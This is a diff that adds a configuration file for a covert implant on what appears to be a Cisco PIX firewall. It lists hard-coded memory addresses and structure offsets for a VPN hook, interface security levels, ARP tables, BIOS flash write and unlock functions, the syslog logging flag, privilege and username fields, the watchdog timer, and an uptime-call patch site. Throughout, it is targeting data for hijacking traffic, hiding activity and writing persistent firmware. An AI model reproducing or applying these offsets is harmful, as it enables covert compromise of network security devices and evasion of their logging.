@@ -1,0 +1,93 @@
+; --- SECTION I ---
+;
+0x10063584            // pix version
+0x20f000              // address of implant configuration
+0x0   0x001011b0      // allocb
+0x1   0x00101394      // freeb
+0x2   0x00101a14      // open
+0x3   0x0021261c      // put
+0x4   0x00101aa8      // close
+0x5   0x00511e08      // atoip
+0x6   0x004ff480      // memset
+0x7   0x00504098      // memcpy
+0x8   0x005054c8      // malloc
+0x9   0x00506018      // free
+0xa   0x00102aa8      // printf
+0xb   0x004f00e8      // des_encrypt
+0xc   0x0050fb78      // isprint
+0xd   0x004f0bc8      // des_set_key
+0xe   0x00260c54      // sha (pre-631)/sha1
+0xf   0x004224c4      // rand
+0x15  0x00105ce8      // process_create
+0x16  0x001069fc      // process_suspend
+0x17  0x00106b28      // process_sleep_for
+0x18  0x004e0264      // show_process
+0x19  0x00107390      // bark
+0x1a  0x005a41c4      // cur_t
+0x2a  0x3c            // rptr structure offset
+0x2b  0x44            // wptr structure offset
+0x2c  0x14            // inIfc (incoming interface) structure offset
+0x2d  0x00324cf4      // vpn hook
+0x2e  0x38            // vpn munge offset
+0x30  0x005b65b4      // address of interface 0 security level
+0x31  0x005b65b8      // address of interface 0 name
+0x32  0x005b6594      // address of interface 0 IP
+0x33  0x268           // length of interface struct
+0x34  0x00620c78      // max number of interface cards
+0x35  0x006214a0      // internal_clock
+0x36  0x005abe40      // addr of flash structure
+;
+; --- END OF SECTION I ---
+;
+:EOS:
+;
+; --- SECTION II ---
+;
+InterfaceAddr       0x005b6594      // matches entry 0x32 above
+InterfaceLeng       0x1810          // 10 times entry 0x33 above
+IntSecurityOffset   0x20            // security level field offset
+IntNameOffset       0x24            // interface name field offset
+FlashClassAddr      0x005abe40      // addr of flash structure
+CryptoDeviceAddr    0x0056a2f8      // addr of crypto structure
+ArpTableAddrPtr     0x0054af64      // addr of first entry in ARP table
+ArpTableLastPtr     0x0054af6c      // addr of last entry in ARP table
+NumInterfaces       0x005b60e8      // addr of pointer to number of interfaces
+IfaceStruct2        0x005b1ce0      // addr of pointer to second smaller interface struct
+IfaceStruct2Len     0xa8            // length of 2nd smaller interface struct used by arp cache
+BiosClassAddr       0x005abe08      // addr of the bios class structure
+BiosWriteAddr1      0x001cc404      // addr of the bios write function for one specific bios
+BiosWriteAddr2      0x001d0ed4      // addr of the bios write function for one specific bios
+BiosWriteAddr3      0x001d15f4      // addr of the bios write function for one specific bios
+BiosWriteAddr4      0x001d32b8      // addr of the bios write function for one specific bios
+BiosWriteAddr5      0x001d3b0c      // addr of the bios write function for one specific bios
+BiosWriteOffset     0x00000020      // offset into the bios structure where write addr is located
+BiosReadE28F6       0x001d3798      // addr of the bios read function for e28f640j3 chip
+BiosLockE28F6       0x001d3d18      // addr of the bios block lock/unlock function for e28f640j3 chip
+AnnounceFunc        0x001019c4      // addr of the device announce function
+DevIoctlOffset      0x00000070      // offset to the ioctl function in a device structure
+CIStartFunc         0x0010a150      // addr of the command interface start function -- telnet function
+CommandListAddr     0x0054d26c      // addr of the command list -- first parameter of ci
+DeviceListPtrAddr   0x00562070      // pointer to the first entry in the device table -- find in announce
+DeviceNextPtrOffset 0x50            // offset into the device table entry which has pointer to next entry -- find in announce
+StrcmpFuncAddr      0x0050eb70      // address of strcmp -- search for 'strcmp'
+SyslogFlagPtrAddr   0x00556fd4      // pointer to the logging flag. -- search for 'Syslog logging:'
+PGDGETValue         0x85b00001      // The value used for PGD_GET when calling the pager ioctl
+PGDPUSHValue        0x85b00002      // The value used for PGD_PUSH when calling the pager ioctl
+PGDSETValue         0x85b00000      // The value used for PGD_SET when calling the pager ioctl
+StdChOffset         0x54            // Offset into a thread struct containing the stdch pointer
+StdErrOffset        0x58            // Offset into a thread struct containing the stderr pointer
+PrivFlagOffset      0x0c            // offset into an environment struct containing the privilege level indicator
+UnameOffset         0x14            // offset into an environment struct containing the username 
+EnvPtrOffset        0x5c            // offset into a thread struct containing the pointer to the environment struct  
+Open                0x00101a14      // channel open
+WatchDogTimeout     0x00539828      // Address where the thread timeout value is stored 
+UpTimeCounter       0x005a3980      // Address of the up time counter
+Get_uptime_secs_addr            0x00515a68  // Address of the function that fetches the uptime
+Modified_getuptime_code_addr    0x004e9511  // Address to the next nearest 20 nops
+Get_uptime_secs_call_instr_addr 0x004e9245  // Address of the location of the get_uptime_secs call instruction
+AvailMemoryPtr      0x005a4214      // Address of total available memory
+;
+; --- END OF SECTION II ---
+;
+:EOS:
+;
